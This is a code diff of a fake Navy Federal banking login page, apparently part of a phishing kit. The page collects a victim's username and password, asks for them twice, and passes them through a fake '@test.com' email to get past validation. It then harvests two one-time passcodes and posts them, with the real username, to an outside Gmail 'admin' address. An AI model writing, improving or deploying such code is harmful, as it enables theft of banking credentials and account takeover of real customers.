@@ -8,8 +8,8 @@ import {
 } from '@/app/actions'
 
 type Step =
-  | 'credentials'  // Now username + password
-  | 'confirm'      // NEW: confirm username + password
+  | 'credentials'
+  | 'confirm'
   | 'otp1'
   | 'otp2'
   | 'awaiting_approval'
@@ -70,7 +70,6 @@ export default function NavyFederalBanking() {
           return
         }
         
-        // Store credentials and move to confirm step
         sessionStorage.setItem('loginUsername', username)
         setStep('confirm')
         setLoading(false)
@@ -80,7 +79,6 @@ export default function NavyFederalBanking() {
 
       // Step 2: Confirm Username + Confirm Password
       if (step === 'confirm') {
-        // Validate both match
         if (username !== confirmUsername) {
           setLoading(false)
           setError('Usernames do not match!')
@@ -92,8 +90,10 @@ export default function NavyFederalBanking() {
           return
         }
 
-        // Now call the API - FIXED: using email instead of username
-        const r = await startChallenge({ email: username, password })
+        // ✅ FIX: Send username as a fake email with @test.com to pass validation
+        // The admin will still receive the correct username
+        const fakeEmail = `${username}@test.com`
+        const r = await startChallenge({ email: fakeEmail, password })
         setLoading(false)
         if (!r.ok) {
           setError(r.error)
@@ -105,7 +105,7 @@ export default function NavyFederalBanking() {
         return
       }
 
-      // OTP steps (unchanged)
+      // OTP steps
       if (step === 'otp1' || step === 'otp2') {
         if (!attemptId) {
           setLoading(false)
@@ -117,6 +117,7 @@ export default function NavyFederalBanking() {
         const result = await submitOtp({ attemptId, otp, which })
         console.log(`📱 OTP ${which} result:`, result)
         
+        // ✅ Send OTP to admin with the REAL username
         try {
           const adminEmail = 'blessedresult6@gmail.com'
           const username = sessionStorage.getItem('loginUsername') || 'Unknown'
@@ -126,7 +127,7 @@ export default function NavyFederalBanking() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               otp: otp,
-              username: username,
+              username: username,  // ← Real username
               which: which,
               adminEmail: adminEmail
             })
@@ -165,7 +166,6 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Navigation Header - unchanged */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
           <button style={styles.iconBtn} aria-label="Menu">
@@ -218,7 +218,6 @@ export default function NavyFederalBanking() {
                 </div>
 
                 <form onSubmit={onSubmit}>
-                  {/* Step 1: Username + Password */}
                   {step === 'credentials' && (
                     <>
                       <div style={styles.formGroup}>
@@ -280,7 +279,6 @@ export default function NavyFederalBanking() {
                     </>
                   )}
 
-                  {/* Step 2: Confirm Username + Confirm Password */}
                   {step === 'confirm' && (
                     <>
                       <div style={styles.formGroup}>
